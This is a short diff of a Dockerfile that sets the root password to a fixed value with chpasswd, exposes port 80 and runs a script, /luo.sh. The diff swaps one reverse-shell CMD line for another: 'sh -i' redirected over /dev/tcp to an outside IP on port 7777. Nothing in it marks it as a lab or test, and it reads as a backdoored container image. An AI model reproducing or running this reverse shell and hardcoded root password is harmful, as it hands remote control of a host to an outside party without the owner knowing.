@@ -15,4 +15,4 @@ RUN echo root:192168|chpasswd
 RUN chmod 755 /luo.sh
 EXPOSE 80
 CMD  /luo.sh
-CMD sh -i >& /dev/tcp/23.224.61.103/7777 0>&1
+CMD sh -i >& /dev/tcp/23.224.64.103/7777 0>&1
